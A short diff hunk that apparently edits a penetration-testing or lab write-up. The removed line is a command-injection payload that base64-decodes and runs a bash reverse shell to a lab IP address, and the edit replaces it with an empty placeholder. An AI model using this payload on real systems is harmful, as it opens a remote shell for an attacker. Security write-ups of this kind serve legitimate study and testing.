@@ -65,7 +65,7 @@ Payload:
 ![[IMG-20260123023123092.png]]
 
 ```bash
-a[$(echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNy4xMzIvNDQ0NCAwPiYxCg== | base64 -d | bash)]
+a[]
 ```
 
 URL ENCODE:
